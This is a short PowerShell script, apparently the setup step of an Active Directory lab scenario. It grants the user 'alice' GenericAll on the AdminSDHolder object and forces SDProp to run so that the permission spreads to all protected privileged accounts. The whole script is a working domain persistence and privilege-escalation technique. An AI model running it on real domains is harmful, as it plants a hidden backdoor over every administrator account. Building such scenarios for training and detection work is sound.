# meta4/ad-vm/scenario-20/inject.ps1
# Grants alice GenericAll on AdminSDHolder. SDProp replicates this ACE to
# every protected group member (Domain Admins, Enterprise Admins, etc.)
# every 60 minutes -- so once injected, alice eventually has GenericAll
# on every privileged account in the domain.

$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory

$domainDN  = (Get-ADDomain).DistinguishedName
$adminSDDN = "CN=AdminSDHolder,CN=System,$domainDN"
$alice     = Get-ADUser alice

$acl = Get-Acl "AD:$adminSDDN"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.SecurityIdentifier]$alice.SID,
    [System.DirectoryServices.ActiveDirectoryRights]'GenericAll',
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($ace)
Set-Acl "AD:$adminSDDN" -AclObject $acl

# Force SDProp to run immediately instead of waiting for the 60-min cycle.
$root = [ADSI]"LDAP://RootDSE"
$root.Put('RunProtectAdminGroupsTask', 1)
$root.SetInfo()

Write-Host "[inject-20] alice has GenericAll on AdminSDHolder -- SDProp triggered"
